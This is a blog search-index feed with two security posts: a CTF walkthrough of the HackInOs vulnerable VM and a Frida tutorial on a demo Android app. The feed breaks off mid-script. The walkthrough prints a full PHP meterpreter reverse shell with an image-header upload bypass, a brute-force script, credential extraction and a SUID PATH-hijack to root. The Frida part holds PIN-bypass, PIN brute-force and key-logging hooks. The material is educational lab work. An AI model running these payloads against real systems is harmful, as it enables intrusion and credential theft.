<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HackInOs Walkthrough</title>
      <link href="/2019/05/16/HackInOs-Walkthrough/"/>
      <url>/2019/05/16/HackInOs-Walkthrough/</url>
      
        <content type="html"><![CDATA[<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5bf72b3154516f79"></script><p><img src="hackinos.png" alt></p><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>HackinOS is a beginner level CTF style vulnerable machine. I created this VM for my university’s cybersecurity community and all cyber security enthusiasts. I thank Mehmet Oguz Tozkoparan, Ömer Faruk Senyayla, and Tufan Gungor for their help during creating this lab.</p><h2 id="Port-scanning"><a href="#Port-scanning" class="headerlink" title="Port scanning"></a>Port scanning</h2><p>The nmap scan gave me the following output:</p><pre><code>root :: ~ » nmap -A -p- 192.168.43.96 -oN nmap_scanNmap scan report for vulnvm (192.168.43.96)Host is up (0.00072s latency).Not shown: 65533 closed portsPORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   2048 d9:c1:5c:20:9a:77:54:f8:a3:41:18:92:1b:1e:e5:35 (RSA)|   256 df:d4:f2:61:89:61:ac:e0:ee:3b:5d:07:0d:3f:0c:87 (ECDSA)|_  256 8b:e4:45:ab:af:c8:0e:7e:2a:e4:47:e7:52:f9:bc:71 (ED25519)8000/tcp open  http    Apache httpd 2.4.25 ((Debian))|_http-generator: WordPress 5.0.3|_http-open-proxy: Proxy might be redirecting requests| http-robots.txt: 2 disallowed entries|_/upload.php /uploads|_http-server-header: Apache/2.4.25 (Debian)|_http-title: Blog &amp;#8211; Just another WordPress siteService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>We have 2 TCP port open to work with. I always start with the web server, but it’s a good practice to check the SSH if it is vulnerable.<br>It looks like that on port 8000, there is a web server running (probably Wordpress 5.0.3) and it has 2 disallowed entries in the <code>robots.txt</code> file. One of them is an upload directory, the other one is an upload script written in PHP. Let’s check these out!</p><h2 id="Uploading-images"><a href="#Uploading-images" class="headerlink" title="Uploading images"></a>Uploading images</h2><p>I was presented with a very basic upload site, where you can probably upload different kinds of images. After inspecting the source using the developer tools, I found a comment in the site’s source code. It was a <a href="https://github.com/fatihhcelik/Vulnerable-Machine---Hint" target="_blank" rel="noopener">Github repository link</a>, which contains the source of the upload script. As it turns out, this was a great help!</p><p><img src="comment.png" alt="Comment is hidden in the site&#39;s source code."></p><p>I copied the actual PHP code from the repository and pasted below.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Check if image file is a actual image or fake image</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span><br><span class="line">    $rand_number = rand(<span class="number">1</span>,<span class="number">100</span>);</span><br><span class="line">    $target_dir = <span class="string">"uploads/"</span>;</span><br><span class="line">    $target_file = $target_dir . md5(basename($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>].$rand_number));</span><br><span class="line">    $file_name = $target_dir . basename($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">    $uploadOk = <span class="number">1</span>;</span><br><span class="line">    $imageFileType = strtolower(pathinfo($file_name,PATHINFO_EXTENSION));</span><br><span class="line">    $type = $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>];</span><br><span class="line">    $check = getimagesize($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($check[<span class="string">"mime"</span>] == <span class="string">"image/png"</span> || $check[<span class="string">"mime"</span>] == <span class="string">"image/gif"</span>)&#123;</span><br><span class="line">        $uploadOk = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $uploadOk = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">":)"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">  <span class="keyword">if</span>($uploadOk == <span class="number">1</span>)&#123;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $target_file.<span class="string">"."</span>.$imageFileType);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"File uploaded /uploads/?"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Don’t be intimidated by the code, it’s actually very simple. First of all, it generates a number between 1 and 100. Then, the file name + this random number gets concatenated and the <code>md5()</code> function calculates the MD5 hash. Since, 1 - 100 is not a big range of numbers, we can easily brute-force this. So, if we were to upload a reverse shell, we have to write a small script which loops through those numbers and calculates the MD5 hash of the file name + current index. After that, the script checks whether the MIME type of the file is “image/png” or “image/gif” and if it is the upload will be successful.</p><h2 id="Creating-a-reverse-shell"><a href="#Creating-a-reverse-shell" class="headerlink" title="Creating a reverse shell"></a>Creating a reverse shell</h2><p>I quickly generated a PHP reverse shell with the help of <code>msfvenom</code> and named it “creatively” <code>shell.php</code>. I also added a <code>GIF89a;</code> file header above the reverse shell code to bypass upload restrictions. </p><pre><code>root :: ~/Downloads » sudo msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.43.2 LPORT=9898 -f raw &gt; shell.php[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload[-] No arch selected, selecting arch: php from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 1113 bytesroot :: ~/Downloads » lsshell.phproot :: ~/Downloads » cat shell.php/*&lt;?php /**/ error_reporting(0); $ip = &apos;192.168.43.2&apos;; $port = 9898; if (($f = &apos;stream_socket_client&apos;) &amp;&amp; is_callable($f)) { $s = $f(&quot;tcp://{$ip}:{$port}&quot;); $s_type = &apos;stream&apos;; } if (!$s &amp;&amp; ($f = &apos;fsockopen&apos;) &amp;&amp; is_callable($f)) { $s = $f($ip, $port); $s_type = &apos;stream&apos;; } if (!$s &amp;&amp; ($f = &apos;socket_create&apos;) &amp;&amp; is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = &apos;socket&apos;; } if (!$s_type) { die(&apos;no socket funcs&apos;); } if (!$s) { die(&apos;no socket&apos;); } switch ($s_type) { case &apos;stream&apos;: $len = fread($s, 4); break; case &apos;socket&apos;: $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack(&quot;Nlen&quot;, $len); $len = $a[&apos;len&apos;]; $b = &apos;&apos;; while (strlen($b) &lt; $len) { switch ($s_type) { case &apos;stream&apos;: $b .= fread($s, $len-strlen($b)); break; case &apos;socket&apos;: $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS[&apos;msgsock&apos;] = $s; $GLOBALS[&apos;msgsock_type&apos;] = $s_type; if (extension_loaded(&apos;suhosin&apos;) &amp;&amp; ini_get(&apos;suhosin.executor.disable_eval&apos;)) { $suhosin_bypass=create_function(&apos;&apos;, $b); $suhosin_bypass(); } else { eval($b); } die();%root :: ~/Downloads » nvim shell.phproot :: ~/Downloads » cat shell.phpGIF89a;/*&lt;?php /**/ error_reporting(0); $ip = &apos;192.168.43.2&apos;; $port = 9898; if (($f = &apos;stream_socket_client&apos;) &amp;&amp; is_callable($f)) { $s = $f(&quot;tcp://{$ip}:{$port}&quot;); $s_type = &apos;stream&apos;; } if (!$s &amp;&amp; ($f = &apos;fsockopen&apos;) &amp;&amp; is_callable($f)) { $s = $f($ip, $port); $s_type = &apos;stream&apos;; } if (!$s &amp;&amp; ($f = &apos;socket_create&apos;) &amp;&amp; is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = &apos;socket&apos;; } if (!$s_type) { die(&apos;no socket funcs&apos;); } if (!$s) { die(&apos;no socket&apos;); } switch ($s_type) { case &apos;stream&apos;: $len = fread($s, 4); break; case &apos;socket&apos;: $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack(&quot;Nlen&quot;, $len); $len = $a[&apos;len&apos;]; $b = &apos;&apos;; while (strlen($b) &lt; $len) { switch ($s_type) { case &apos;stream&apos;: $b .= fread($s, $len-strlen($b)); break; case &apos;socket&apos;: $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS[&apos;msgsock&apos;] = $s; $GLOBALS[&apos;msgsock_type&apos;] = $s_type; if (extension_loaded(&apos;suhosin&apos;) &amp;&amp; ini_get(&apos;suhosin.executor.disable_eval&apos;)) { $suhosin_bypass=create_function(&apos;&apos;, $b); $suhosin_bypass(); } else { eval($b); } die();root :: ~/Downloads »</code></pre><p>On the following picture, you can see the intercepted upload request in Burp Suite. At this point, we are able to upload arbitrary files, but we can’t really execute them. </p><p><img src="upload_request.png" alt="Intercepted upload request in Burp Suite."></p><h2 id="Writing-the-exploit"><a href="#Writing-the-exploit" class="headerlink" title="Writing the exploit"></a>Writing the exploit</h2><p>Now, let’s write a simple Python script. First, I stored the target and the file name in separate variables. Then, the loop goes from 1 to 100 and in its body, I created a new file name by appending the current index to the initial file name. We have to hash this string value with the MD5 algorithm. After that, the URL is almost ready, but we have to append the original extension (‘.php’) at the end. I’m waiting one second after each request just in case, but you can decrease this number (or simply comment it out) to make the process faster.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># replace with target IP address</span></span><br><span class="line">target = <span class="string">'http://192.168.43.96:8000/uploads/'</span></span><br><span class="line"><span class="comment"># replace with your file name</span></span><br><span class="line">file_name = <span class="string">'shell.php'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    new_file_name = file_name + str(index)</span><br><span class="line">    print(new_file_name)</span><br><span class="line">    md5hash = hashlib.md5(new_file_name.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    print(<span class="string">'Trying hash: '</span> + md5hash)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.head(target + md5hash + <span class="string">'.php'</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.ConnectionError:</span><br><span class="line">        print(<span class="string">'Failed to connect...'</span>)</span><br></pre></td></tr></table></figure><p>If we found the correct hash the script will “stop” and we should see that a meterpreter shell opened and got a connection back.</p><pre><code>msf5 &gt; use multi/handlermsf5 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcppayload =&gt; php/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set lhost 192.168.43.2lhost =&gt; 192.168.43.2msf5 exploit(multi/handler) &gt; set lport 9898lport =&gt; 9898msf5 exploit(multi/handler) &gt; exploit[*] Started reverse TCP handler on 192.168.43.2:9898[*] Sending stage (38247 bytes) to 192.168.43.96[*] Meterpreter session 1 opened (192.168.43.2:9898 -&gt; 192.168.43.96:32900)meterpreter &gt;</code></pre><div class="addthis_tipjar_inline"></div><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>I usually switch to the netcat like shell with the <code>shell</code> command and explore the machine. In this case, python was installed and I could easily upgrade it to a pseudo TTY shell. Since there was a Wordpress installation I went on to see the <code>wp-config.php</code> file for juicy information. I found out that the database host is <code>db</code>, the database name is <code>wordpress</code> and the password is <code>wordpress</code> too. Here is how I connected to the database:</p><pre><code>python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;www-data@1afdd1f6b82c:/var/www/html$ mysql -h db -u wordpress -pmysql -h db -u wordpress -pEnter password: wordpressWelcome to the MariaDB monitor.  Commands end with ; or \g.Your MySQL connection id is 39Server version: 5.7.25 MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.MySQL [(none)]&gt;</code></pre><p>In the <code>wordpress</code> database, there was a particularly interesting table named <code>host_ssh_cred</code>. Previously, I ran the famous <code>LinEnum.sh</code> script, which identified that we are actually in a Docker container.</p><h2 id="Escaping-the-container"><a href="#Escaping-the-container" class="headerlink" title="Escaping the container"></a>Escaping the container</h2><p>I obviously printed out everything in that table. Be careful, because the <code>pw</code> column actually contains an MD5 hash, not the actual password. So, the real SSH username is <code>hummingbirdscyber</code> and after cracking the hash the real password is <code>123456</code>.</p><pre><code>MySQL [wordpress]&gt; select * from host_ssh_cred;+-------------------+----------------------------------+| id                | pw                               |+-------------------+----------------------------------+| hummingbirdscyber | e10adc3949ba59abbe56e057f20f883e |+-------------------+----------------------------------+1 row in set (0.00 sec)MySQL [wordpress]&gt;</code></pre><p>After logging in with SSH, I explored the available directories and found a file called <code>a.out</code> in the Desktop folder.</p><pre><code>root :: ~ » ssh hummingbirdscyber@192.168.43.96hummingbirdscyber@192.168.43.96&apos;s password:Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.15.0-29-generic x86_64)* Documentation:  https://help.ubuntu.com* Management:     https://landscape.canonical.com* Support:        https://ubuntu.com/advantage349 packages can be updated.248 updates are security updates.New release &apos;18.04.2 LTS&apos; available.Run &apos;do-release-upgrade&apos; to upgrade to it.hummingbirdscyber@vulnvm:~$ lsDesktop    Downloads  Pictures  Templates  examples.desktopDocuments  Music      Public    Videoshummingbirdscyber@vulnvm:~$ cd Desktop/hummingbirdscyber@vulnvm:~/Desktop$ ls -latotal 24drwxr-xr-x  2 hummingbirdscyber hummingbirdscyber 4096 May 19 20:23 .drwxr-xr-x 19 hummingbirdscyber hummingbirdscyber 4096 May 19 20:32 ..-rwsr-xr-x  1 root              root              8720 Mar  1 23:25 a.outhummingbirdscyber@vulnvm:~/Desktop$</code></pre><h2 id="Getting-root-shell"><a href="#Getting-root-shell" class="headerlink" title="Getting root shell"></a>Getting root shell</h2><p>I knew this file is the key to root this box, so I started investigating. I ran the executable and it printed out <code>root</code>. The file also has SUID bit set, so what it means is that the file has root permissions. The next thing I did is to run the <code>strings</code> command on the file. This way, we can identify strings, commands, libraries used, etc.. in the executable. I spotted the <code>whoami</code> command, which is probably responsible for printing out the <code>root</code> text.</p><pre><code>hummingbirdscyber@vulnvm:~/Desktop$ strings a.out/lib64/ld-linux-x86-64.so.2libc.so.6setuidsystemsetgid__libc_start_main__gmon_start__GLIBC_2.2.5UH-HAWAVAAUATL[]A\A]A^A_whoami;*3$&quot;GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.10) 5.4.0 20160609--- snip ---</code></pre><p>The author of the program didn’t use an absolute path, so it means that we can create our own <code>whoami</code> script and the program will execute it like we’re root. As you can see, I created a very simple bash script to spawn a root shell… After that, I added the <code>/home/hummingbirdscyber/Desktop/</code> path before the PATH environment variable to make sure our script gets called instead of the real one. Also, don’t forget to make the shell script executable!</p><pre><code>hummingbirdscyber@vulnvm:~/Desktop$ nano whoamihummingbirdscyber@vulnvm:~/Desktop$ cat whoami#!/bin/bashecho &quot;Spawning root shell... Enjoy!&quot;/bin/bashhummingbirdscyber@vulnvm:~/Desktop$ export PATH=/home/hummingbirdscyber/Desktop/:$PATHhummingbirdscyber@vulnvm:~/Desktop$ echo $PATH/home/hummingbirdscyber/Desktop/:/home/hummingbirdscyber/bin:/home/hummingbirdscyber/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/binhummingbirdscyber@vulnvm:~/Desktop$ chmod +x whoamihummingbirdscyber@vulnvm:~/Desktop$ ./a.outSpawning root shell... Enjoy!root@vulnvm:~/Desktop#</code></pre><p>Finally, I printed out the root flag, which was a nice ASCII hummingbird.</p><pre><code>root@vulnvm:/root# cat flagCongratulations!                            -ys-                                /mms.                                +NMd+`                            `/so/hMMNy-                                `+mMMMMMMd/           ./oso/-                                `/yNMMMMMMMMNo`   .`   +-                                .oyhMMMMMMMMMMN/.     o.                                    `:+osysyhddhs`    `o`                                    .:oyyhshMMMh.   .:                                `-//:. `:sshdh: `                                            -so:.                                            .yy.                                        :odh                                        +o--d`                                    /+. .d`                                    -/`  `y`                                `:`   `/                                `.     `root@vulnvm:/root#</code></pre><h2 id="Before-you-go"><a href="#Before-you-go" class="headerlink" title="Before you go"></a>Before you go</h2><p>If you found this article helpful, please share to help others with similar interest find it! + Feedback and donations are always welcome!</p><p><br><div align="center" class="addthis_inline_share_toolbox"></div><br></p>]]></content>
      
      
      <categories>
          
          <category> CTF Walkthroughs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> ctf </tag>
            
            <tag> walkthrough </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Introduction to Frida</title>
      <link href="/2019/05/11/Introduction-to-Frida/"/>
      <url>/2019/05/11/Introduction-to-Frida/</url>
      
        <content type="html"><![CDATA[<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5bf72b3154516f79"></script><p><img src="frida.png" alt></p><blockquote><p>Frida is a dynamic instrumentation toolkit for developers,<br>reverse-engineers, and security researchers.</p></blockquote><h2 id="Project-requirements"><a href="#Project-requirements" class="headerlink" title="Project requirements"></a>Project requirements</h2><p>Required tools to follow along:</p><ul><li>Java decompiler (JD-GUI)</li><li>Android emulator (Genymotion)</li><li>Dynamic instrumentation toolkit (Frida)</li></ul><p>You’ll need to download 3 files from here: <a href="https://github.com/frida/frida/releases" target="_blank" rel="noopener">https://github.com/frida/frida/releases</a></p><ul><li>Python-frida</li><li>Python-frida-tools</li><li>Frida-server-android</li></ul><p>Depending on your distribution, you can easily install the first two and their dependencies. As for the frida-server-android, I’m going to walk you through the installation and emulator setup.</p><h2 id="The-Android-application"><a href="#The-Android-application" class="headerlink" title="The Android application"></a>The Android application</h2><p>I created an Android application just for demonstration and testing purposes. I’m going to use it during the examples, you can download it from Github: <a href="https://github.com/t0thkr1s/frida-demo/releases" target="_blank" rel="noopener">https://github.com/t0thkr1s/frida-demo/releases</a></p><h2 id="Creating-a-virtual-device"><a href="#Creating-a-virtual-device" class="headerlink" title="Creating a virtual device"></a>Creating a virtual device</h2><p>I added a new Genymotion virtual device with Android version 5.0 (API 21).<br>The setup is pretty straightforward just the usual next, next and finish. It’s time to download the <a href="https://github.com/frida/frida/releases" target="_blank" rel="noopener">Frida Server</a> for the Android client. Don’t forget to check the correct architecture! Next, we need to upload the server to the emulator. I installed Genymotion in the /opt directory</p><pre><code>t0thkr1s@btksoftware:/opt/genymobile/genymotion/tools$ lsaapt  adb  glewinfo  lib64</code></pre><p>Uploading the file:</p><pre><code>./adb push ~/Downloads/frida_server /data/local/tmp/</code></pre><p>Changing file permissions:</p><pre><code>./adb shell &quot;chmod 755 /data/local/tmp/frida_server&quot;</code></pre><p>Running the server in detached mode:</p><pre><code>./adb shell &quot;/data/local/tmp/frida_server &amp;&quot;</code></pre><p>Now, the emulator is ready and the server is running!</p><h2 id="Reverse-engineering"><a href="#Reverse-engineering" class="headerlink" title="Reverse engineering"></a>Reverse engineering</h2><p>In order to understand the inner workings of an application, we need to reverse engineer it. Fortunately, we can restore the java source files easily.</p><p>I’m not going to write about reverse engineering Android apps here, because I already did it in my previous post. <a href="https://medium.com/btk-software/reverse-engineering-diva-application-d59e1b242208" target="_blank" rel="noopener">Check it out!</a></p><p>I have to admit that the reverse engineering of the demo application reveals all the secrets hidden in it. So, in order to make it more realistic let’s suppose the encryption key is generated from the user-provided PIN code which is used to encrypt private data in the app.</p><p>In this case, brute-forcing the PIN code might be a good solution for compromising the security of the whole app. That’s why you need to choose long and strong PINs.</p><h2 id="PIN-Bypass"><a href="#PIN-Bypass" class="headerlink" title="PIN Bypass"></a>PIN Bypass</h2><p>Okay, you looked through the reversed source code and you found a method, which checks if the provided PIN is correct or not.</p><blockquote><p>Spoiler: The PIN is in the strings.xml file.</p></blockquote><p>Most of the time, it’s not that easy… Let’s suppose, we don’t know the PIN. You found the <em>PinUtil</em> class and the <em>boolean</em> <em>checkPin(String pin) </em>method. This checks the pin and returns true if the pin is correct, otherwise, it returns false.</p><p>The idea here is that we don’t need to know the pin just return true and we’re in. The following python script does just like that. I wrote a little Javascript code using the Javascript API and hardcoded it in the python script. Basically, it uses the <em>PinUtil’</em>s <em>checkPin()</em> method and overrides the return value. It’s that easy. Next, you need to specify the package name of the application to attach Frida, then load the script and wait for the log messages.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line">jscode = <span class="string">"""</span></span><br><span class="line"><span class="string">Java.perform(function() &#123;</span></span><br><span class="line"><span class="string"> console.log("[ * ] Starting implementation override...")</span></span><br><span class="line"><span class="string"> var MainActivity = Java.use("infosecadventures.fridademo.utils.PinUtil");</span></span><br><span class="line"><span class="string"> MainActivity.checkPin.implementation = function(pin)&#123;</span></span><br><span class="line"><span class="string">     console.log("[ + ] PIN check successfully bypassed!")</span></span><br><span class="line"><span class="string">     return true;</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">process = frida.get_usb_device().attach(<span class="string">'infosecadventures.fridademo'</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">print(<span class="string">'[ * ] Running Frida Demo application'</span>)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><h2 id="PIN-Brute-force"><a href="#PIN-Brute-force" class="headerlink" title="PIN Brute-force"></a>PIN Brute-force</h2><p>Previously, I mentioned that knowing the PIN could be really beneficial. In this example, I going to show you how to brute-force with Frida.</p><p>First, let’s suppose that the <em>PinUtil</em>’s <em>checkPin(String pin)</em> method is not static. By using <em>Java.choose, </em>we can search the memory for a <em>PinUtil</em> instance and the <em>onMatch</em> is called when the instance is found. Then, we can use that instance’s method<em> </em>in a loop to test all numbers with a length of 4. This is actually not a time-consuming process. You can even try brute-forcing numbers with a length of 5 and finish in a day depending on the number.</p><p>The <em>PinUtil</em>’s class <em>checkPin(String pin)</em> function is static. This means that we don’t need to search for the <em>PinUtil</em> object in the memory just call the method using the class name. However, I implemented both (static and non-static solution) in the script below. I hope it’s not confusing. The <em>jscode</em> variable will be overridden by the second assignment and that will be used.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># For non-static classes</span></span><br><span class="line">jscode = <span class="string">"""</span></span><br><span class="line"><span class="string">Java.perform(function() &#123;</span></span><br><span class="line"><span class="string"> console.log("[ * ] Starting PIN Brute-force, please wait...");</span></span><br><span class="line"><span class="string"> Java.choose("infosecadventures.fridademo.utils.PinUtil", &#123;</span></span><br><span class="line"><span class="string">  onMatch: function(instance) &#123;</span></span><br><span class="line"><span class="string">   console.log("[ * ] Instance found in memory: " + instance);</span></span><br><span class="line"><span class="string">   for(var i = 1000; i &lt; 9999; i++)&#123;</span></span><br><span class="line"><span class="string">    if(instance.checkPin(i + "") == true)&#123;</span></span><br><span class="line"><span class="string">     console.log("[ + ] Found correct PIN: " + i);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string">  &#125;,</span></span><br><span class="line"><span class="string">  onComplete: function() &#123; &#125;</span></span><br><span class="line"><span class="string"> &#125;);</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># For static classes</span></span><br><span class="line">jscode = <span class="string">"""</span></span><br><span class="line"><span class="string">Java.perform(function () &#123;</span></span><br><span class="line"><span class="string">    console.log("[ * ] Starting PIN Brute-force, please wait...")</span></span><br><span class="line"><span class="string">    var PinUtil = Java.use("infosecadventures.fridademo.utils.PinUtil");</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    for(var i=1000; i &lt; 9999; i++)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        if(PinUtil.checkPin(i+"") == true)&#123;</span></span><br><span class="line"><span class="string">            console.log("[ + ] Found correct PIN: " + i);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">process = frida.get_usb_device().attach(<span class="string">'infosecadventures.fridademo'</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">print(<span class="string">'[ * ] Running Frida Demo application'</span>)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><div class="addthis_tipjar_inline"></div><h2 id="Root-Check-Bypass"><a href="#Root-Check-Bypass" class="headerlink" title="Root Check Bypass"></a>Root Check Bypass</h2><p>I included this example because it’s quite common in banking and other applications to restrict rooted device access. It’s a simple check and very, very similar to the PIN bypass example.</p><blockquote><p>I encourage you to write the script yourself and check back, when you finished!</p></blockquote><h2 id="Finding-the-Encryption-Key"><a href="#Finding-the-Encryption-Key" class="headerlink" title="Finding the Encryption Key"></a>Finding the Encryption Key</h2><p>Now, everything in this script should also be familiar to you. You can log a method’s incoming parameters and return normally. This way, we have the ability to log the encryption key used and also the plain text. Again, the key is hardcoded in the code, but you won’t always be this lucky in real life. Here is how I implemented this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">"""</span></span><br><span class="line"><span class="string">Java.perform(function() &#123;</span></span><br><span class="line"><span class="string"> console.log("[ * ] Starting implementation override...")</span></span><br><span class="line"><span class="string"> var EncryptionUtil = Java.use("infosecadventures.fridademo.utils.EncryptionUtil");</span></span><br><span class="line"><span class="string"> EncryptionUtil.encrypt.implementation = function(key, value)&#123;</span></span><br><span class="line"><span class="string">            console.log("Key: ");</span></span><br><span class="line"><span class="string">            console.log(key);</span></span><br><span class="line"><span class="string">            console.log("Value: ");</span></span><br><span class="line"><span class="string">            console.log(value);</span></span><br><span class="line"><span class="string">     return this.encrypt(key, value);</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">process = frida.get_usb_device().attach(<span class="string">'infosecadventures.fridademo'</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">print(<span class="string">'[ * ] Running Frida Demo application'</span>)</span><br><span 